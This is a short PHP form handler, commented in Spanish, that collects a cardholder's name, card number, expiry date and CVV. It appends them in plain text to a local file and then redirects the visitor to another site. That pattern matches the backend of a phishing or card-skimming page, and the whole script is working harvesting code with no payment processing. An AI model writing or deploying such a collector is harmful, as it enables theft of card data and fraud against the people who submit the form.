<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $name = htmlspecialchars($_POST['name']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $expiryDate = htmlspecialchars($_POST['expiryDate']);
    $cvv = htmlspecialchars($_POST['cvv']);
    
    // Formato de los datos a guardar
    $data = "Nombre: " . $name . "\nNúmero de tarjeta: " . $cardNumber . "\nFecha de vencimiento: " . $expiryDate . "\nCVV: " . $cvv . "\n\n";
    
    // Escribir en el archivo de texto
    file_put_contents("form_data.txt", $data, FILE_APPEND);

    // Redirigir a una URL después de guardar
    header("Location: https://nueva-url.com");
    exit();
} else {
    echo "Método no permitido";
}
?>
